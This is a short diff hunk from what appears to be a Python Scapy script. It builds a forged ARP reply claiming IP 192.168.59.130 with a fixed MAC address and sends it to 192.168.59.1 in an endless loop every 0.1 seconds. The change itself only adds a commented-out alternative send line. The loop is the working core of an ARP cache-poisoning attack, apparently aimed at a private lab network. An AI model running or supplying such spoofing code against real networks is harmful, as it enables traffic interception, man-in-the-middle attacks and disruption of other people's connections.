@@ -23,6 +23,7 @@ arp=ARP(op=2,psrc="192.168.59.130",pdst="192.168.59.1",hwsrc="00:0C:29:F7:CB:BF"
 
 while 1:
     send(arp)
+    #sendp(Ether()/arp)
     time.sleep(0.1)
 
 
